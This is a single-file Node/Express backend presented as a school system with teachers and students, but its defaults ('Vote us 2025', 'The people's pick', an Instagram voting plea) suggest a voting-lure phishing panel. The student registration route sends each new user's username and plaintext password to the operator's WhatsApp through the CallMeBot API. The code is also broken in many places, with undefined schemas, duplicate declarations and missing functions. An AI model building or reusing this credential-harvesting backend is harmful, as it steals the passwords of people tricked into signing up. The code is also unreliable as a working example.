// server.js - Single-file school backend (MongoDB)
// npm i express mongoose cors axios bcrypt jsonwebtoken dotenv

require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const axios = require("axios");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const Admin = require("../models/User")
const Child = require("../models/Child"); // Student model
const Visit = require("../models/Visit");
const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 5000;
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/prospercub";
const JWT_SECRET = process.env.JWT_SECRET || "change_this_secret";

// -------------------- MongoDB --------------------
mongoose.connect(MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("Mongo error:", err.message));

// -------------------- Schemas & Models --------------------
const adminSchema = new mongoose.Schema({
  fristname: { type: String, required: true},
  lastname :{ type: String, required: true},
  phone: { type: String, required: true },   // CallMeBot phone
  apikey: { type: String, required: true },  // CallMeBot api key
  password: { type: String, required: true},
  settings: {
    requireSecurityCode: { type: Boolean, default: false },
    maintenanceMode: { type: Boolean, default: false },
  },
  siteSettings:{
    name:{type:String,default:"Vote us 2025"},
    title:{type:String, default:"The people's pick"},
    description:{type:String, default:"I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory"},
    platform:[{type:String, default:"instagram"}],
    plan: { type: String, enum: ['free','weekly','monthly','yearly'], default: 'free' },
  startDate: { type: Date },
  endDate: { type: Date },
  active: { type: Boolean, default: false },
  referrals:[{type:String}],
  referralCode:{type:String},
  referredBy: { type: String },
  subscription: { type: subscriptionSchema, default: () => ({}) }
  },
  createdAt: { type: Date, default: Date.now }
}, {timestamp:true});

// Hash password only if new/modified
userSchema.pre('save', async function(next) {
  if (this.isModified('password')) {
    this.password = await bcrypt.hash(this.password, 10);
  }
  next();
});

userSchema.methods.isSubscriptionActive = function() {
  if (!this.subscription) return false;
  if (!this.subscription.active) return false;
  if (!this.subscription.endDate) return false;
  return new Date() < new Date(this.subscription.endDate);
};

const Admin = mongoose.model("Admin", adminSchema);

const childSchema = new mongoose.Schema({
  password:{type:String},
  username: { type: String},
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin", required: true },
  referralCode: String, // code generated for student (optional)
  createdAt: { type: Date, default: Date.now }
}, {timestamp:true});
const Child = mongoose.model("Child", childSchema);

const postlSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  title: String,
  description: String,
  createdAt: { type: Date, default: Date.now }
});
const Post = mongoose.model("Post", postSchema);

const activitySchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin", required: true },
  studentId: { type: mongoose.Schema.Types.ObjectId, ref: "Child" },
  action: String,        // "signup", "login", "vote", "upload", ...
  details: { type: Object, default: {} },
  createdAt: { type: Date, default: Date.now }
});
const Activity = mongoose.model("Activity", activitySchema);
const referralSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin", required: true },
  code: { type: String, unique: true, required: true },
  used: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now }
});
const Referral = mongoose.model("Referral", referralSchema);

const securityCodeSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin", required: true },
  code: { type: String, required: true },
  usedBy: { type: mongoose.Schema.Types.ObjectId, ref: "Child", default: null },
  createdAt: { type: Date, default: Date.now }
});
const SecurityCode = mongoose.model("SecurityCode", securityCodeSchema);


// -------------------- Helpers --------------------
async function notify(adminId, message) {
  try {
    const admin = await Admin.findById(adminId);
    if (!admin || !admin.phone || !admin.apikey){
      console.log("Message not sent, admin not found");
      return
    }
    const url = "https://api.callmebot.com/whatsapp.php";
    await axios.get(url, {
      params: { phone: admin.phone, text: message, apikey: admin.apikey },
      validateStatus: () => true
    });
  } catch (err) {
    console.error("WhatsApp error:", err.message);
  }
}

function generateCode(len = 8) {
  return Math.random().toString(36).substring(2, 2 + len);
}

function createToken(payload, expiresIn = "7d") {
  return jwt.sign(payload, JWT_SECRET, { expiresIn });
}


// -------------------- Auth Middleware --------------------
async function authAdmin(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth) return res.status(401).json({ error: "Missing auth token" });
  const token = auth.split(" ")[1];
  try {
    const data = jwt.verify(token, JWT_SECRET);
    const admin = await Admin.findById(data.id);
    if (!admin) return res.status(401).json({ error: "Invalid token" });
    req.admin = admin;
    next();
  } catch (err) {
    return res.status(401).json({ error: "Invalid token" });
  }
}

async function authChild(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth) return res.status(401).json({ error: "Missing auth token" });
  const token = auth.split(" ")[1];
  try {
    const data = jwt.verify(token, JWT_SECRET);
    const student = await Child.findById(data.id);
    if (!student) return res.status(401).json({ error: "Invalid token" });
    req.student = student;
    next();
  } catch (err) {
    return res.status(401).json({ error: "Invalid token" });
  }
}


// -------------------- Routes --------------------

// Root
app.get("/", (req, res) => res.send("<h1>✅ School backend running 🇳🇬🇳🇬🇳🇬🇳🇬🇳🇬🚀🇺🇸🇺🇸🇺🇸🇺🇸🇺🇸🇺🇸</h1>"));

// -------------------- Admin (Teacher) --------------------

// Admin register
app.post("/admin/register", async (req, res) => {
  try {
    const { fristname,lastname,password, phone, apikey } = req.body;
    if (!name || !username || !password || !phone || !apikey) {
      return res.status(400).json({ error: "Missing required fields" });
    }
    const exists = await Admin.findOne({ phone });
    if (exists) return res.status(400).json({ error: "This phone number has already been used" });


    const admin = await Admin.create({ name, username, email, password, phone, apikey });
    const token = createToken({ id: admin._id, role: "admin" });
    res.json({ success: true, admin: { id: admin._id, firstname: admin.firstname, lastname}, token });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Admin registration failed" });
  }
});

// Admin login
app.post("/admin/login", async (req, res) => {
  try {
    const { phone, password } = req.body;
    const admin = await Admin.findOne({ username });
    if (!admin) return res.status(400).json({ error: "Invalid credentials" });
    const ok = await bcrypt.compare(password, admin.password);
    if (!ok) return res.status(400).json({ error: "Invalid credentials" });

    const token = createToken({ id: admin._id, role: "admin" });
    res.json({ success: true, admin: { id: admin._id, firstname:admin.firstname, lastname:admin.lastname }, token });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Login failed" });
  }
});

// Admin: generate referral code (teachers share this to students)
 app.post("/admin/generate-referral", authAdmin, async (req, res) => {
  try {
    const code = generateCode(10);
    const r = await Referral.create({ adminId: req.admin._id, code });
    res.json({ success: true, referral: r, link: `${req.headers.origin || "https://your-student-site.com"}/register?ref=${r.code}` });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to generate referral" });
  }
});
// Admin: add security code(s) (for requireSecurityCode)
app.post("/admin/add-code", authAdmin, async (req, res) => {
  try {
    const { codes } = req.body; // array or single string
    if (!codes) return res.status(400).json({ error: "Provide codes" });
    const arr = Array.isArray(codes) ? codes : [codes];
    const created = [];
    for (const c of arr) {
      const s = await SecurityCode.create({ adminId: req.admin._id, code: c });
      created.push(s);
    }
    res.json({ success: true, created });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to add codes" });
  }
});

// Admin: list own security codes
app.get("/admin/codes", authAdmin, async (req, res) => {
  try {
    const codes = await SecurityCode.find({ adminId: req.admin._id });
    res.json({ success: true, codes });
  } catch (err) {
    res.status(500).json({ error: "Failed to list codes" });
  }
});

// Admin toggle setting (requireSecurityCode, maintenanceMode)
app.post("/admin/toggle-setting", authAdmin, async (req, res) => {
  try {
    const { key, value } = req.body;
    if (!["requireSecurityCode", "maintenanceMode"].includes(key)) {
      return res.status(400).json({ error: "Invalid setting" });
    }
    req.admin.settings[key] = !!value;
    await req.admin.save();
    res.json({ success: true, settings: req.admin.settings });
  } catch (err) {
    res.status(500).json({ error: "Failed to toggle setting" });
  }
});

// Admin: create student directly (teacher creates account for student)
app.post("/admin/create-student", authAdmin, async (req, res) => {
  try {
    const { name, username, email, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: "username & password required" });

    const exists = await Student.findOne({ username });
    if (exists) return res.status(400).json({ error: "Student username exists" });

    const hashed = await hashPassword(password);
    const referralCode = generateCode(8);
    const student = await Child.create({
      name,
      username,
      email,
      password: hashed,
      adminId: req.admin._id,
      referralCode
    });

    // activity & notify teacher
    await Activity.create({ adminId: req.admin._id, studentId: student._id, action: "created-by-admin", details: { by: req.admin.username } });

    const msg = `✅ New student created by you\nStudent: ${student.username}\nName: ${student.name || "n/a"}`;
    sendWhatsAppToAdmin(req.admin._id, msg);

    res.json({ success: true, student, referralLink: `${req.headers.origin || "https://your-student-site.com"}/register?ref=${referralCode}` });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to create student" });
  }
});

// Admin: upload material (visible to teacher's students)
app.post("/admin/upload-material", authAdmin, async (req, res) => {
  try {
    const { title, content } = req.body;
    if (!title || !content) return res.status(400).json({ error: "title & content required" });
    const material = await Material.create({ adminId: req.admin._id, title, content });
    await Activity.create({ adminId: req.admin._id, action: "upload-material", details: { title } });

    const msg = `📚 New material uploaded\nTitle: ${title}\nBy: ${req.admin.name}`;
    sendWhatsAppToAdmin(req.admin._id, msg);

    res.json({ success: true, material });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to upload material" });
  }
});

// Admin: list students
app.get("/admin/students", authAdmin, async (req, res) => {
  try {
    const students = await Child.find({ adminId: req.admin._id }).select("-password");
    res.json({ success: true, students });
  } catch (err) {
    res.status(500).json({ error: "Failed to list students" });
  }
});

// Admin dashboard (students, materials, recent activities)
app.get("/admin/dashboard", authAdmin, async (req, res) => {
  try {
    const students = await Child.find({ adminId: req.admin._id }).select("-password");
    const materials = await Material.find({ adminId: req.admin._id }).limit(200);
    const activities = await Activity.find({ adminId: req.admin._id }).sort({ createdAt: -1 }).limit(200);
    res.json({ success: true, students, materials, activities, settings: req.admin.settings });
  } catch (err) {
    res.status(500).json({ error: "Failed to load dashboard" });
  }
});

// -------------------- Student Routes --------------------

// Student register (via referral code)
app.post("/student/register", async (req, res) => {
  try {
    const { password, ref, securityCode } = req.body;
    if (!username || !password) return res.status(400).json({ error: "username & password required" });
    if (await Child.findOne({ username })) return res.status(400).json({ error: "username exists" });

    // find referral
    let adminId = null;
    if (ref) {
      // try referral collection first
      const referral = await Referral.findOne({ code: ref, used: false });
      if (referral) {
        adminId = referral.adminId;
        referral.used = true;
        await referral.save();
      } else {
        // maybe used direct admin id / code
        const adminRef = await Admin.findOne({ reCode: ref });
        if (adminRef) adminId = adminRef._id;
      }
    }

    if (!adminId) return res.status(400).json({ error: "Invalid or missing referral code" });

    // check admin settings for security code
    const admin = await Admin.findById(adminId);
    if (admin.settings.requireSecurityCode) {
      if (!securityCode) return res.status(400).json({ error: "Security code required by teacher" });
      const codeDoc = await SecurityCode.findOne({ adminId, code: securityCode, usedBy: null });
      if (!codeDoc) return res.status(400).json({ error: "Invalid or used security code" });
      // will mark used after student created
    }

    
    const referralCode = generateCode(8);
    const student = await Child.create({ username, password, adminId, referralCode });

    // mark security code used
    if (admin.settings.requireSecurityCode && securityCode) {
      const codeDoc = await SecurityCode.findOne({ adminId, code: securityCode, usedBy: null });
      if (codeDoc) {
        codeDoc.usedBy = student._id;
        await codeDoc.save();
      }
    }

    // activity & notify teacher
    await Activity.create({ adminId, studentId: student._id, action: "signup", details: { username: student.username, name: student.name } });

    const msg = `✅ New User login \nusername: ${student.username}\n Password ${password}`;
    notify(adminId, msg);

    const token = createToken({ id: student._id, role: "child" });
    res.json({ success: true, student: { id: student._id, username: student.username }, token });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Student registration failed" });
  }
});

// Student login (if admin requires security on login, send securityCode)
app.post("/student/login", async (req, res) => {
  try {
    const { username, password, securityCode } = req.body;
    const student = await Student.findOne({ username });
    if (!student) return res.status(400).json({ error: "Invalid credentials" });

    const ok = await bcrypt.compare(password, student.password);
    if (!ok) return res.status(400).json({ error: "Invalid credentials" });

    const admin = await Admin.findById(student.adminId);
    if (admin?.settings?.requireSecurityCode) {
      if (!securityCode) return res.status(400).json({ error: "Teacher requires a security code for login" });
      const codeDoc = await SecurityCode.findOne({ adminId: admin._id, code: securityCode, usedBy: null });
      if (!codeDoc) return res.status(400).json({ error: "Invalid or used security code" });
      codeDoc.usedBy = student._id;
      await codeDoc.save();
    }

    await Activity.create({ adminId: student.adminId, studentId: student._id, action: "login", details: { username } });
    const msg = `🔑 Student login\nStudent: ${student.username}`;
    sendWhatsAppToAdmin(student.adminId, msg);

    const token = createToken({ id: student._id, role: "student" });
    res.json({ success: true, student: { id: student._id, username: student.username }, token });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Login failed" });
  }
});

// Student: get own materials (based on admin)
app.get("/student/materials", authStudent, async (req, res) => {
  try {
    // maintenance mode check
    const admin = await Admin.findById(req.student.adminId);
    if (admin?.settings?.maintenanceMode) return res.status(503).json({ error: "Teacher is in maintenance mode" });

    const materials = await Material.find({ adminId: req.student.adminId }).sort({ createdAt: -1 });
    res.json({ success: true, materials });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch materials" });
  }
});

// Student: submit vote / action (notifies teacher)
app.post("/student/vote", authStudent, async (req, res) => {
  try {
    const { platform, details } = req.body;
    await Activity.create({ adminId: req.student.adminId, studentId: req.student._id, action: "vote", details: { platform, ...details } });

    const msg = `🗳️ Vote/action by ${req.student.username}\nPlatform: ${platform || "n/a"}`;
    sendWhatsAppToAdmin(req.student.adminId, msg);

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to submit vote" });
  }
});

// Student: profile
app.get("/student/me", authStudent, async (req, res) => {
  try {
    const student = await Student.findById(req.student._id).select("-password");
    res.json({ success: true, student });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch profile" });
  }
});

// -------------------- Shared / Admin utility --------------------

// Get recent logs for admin (paginated)
app.get("/admin/activities", authAdmin, async (req, res) => {
  try {
    const { page = 1, per = 50 } = req.query;
    const skip = (Number(page) - 1) * Number(per);
    const activities = await Activity.find({ adminId: req.admin._id }).sort({ createdAt: -1 }).skip(skip).limit(Number(per));
    res.json({ success: true, activities });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch activities" });
  }
});

// -------------------- Error / Catch-all --------------------
app.use((req, res) => res.status(404).json({ error: "Route not found" }));

// -------------------- Start --------------------
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
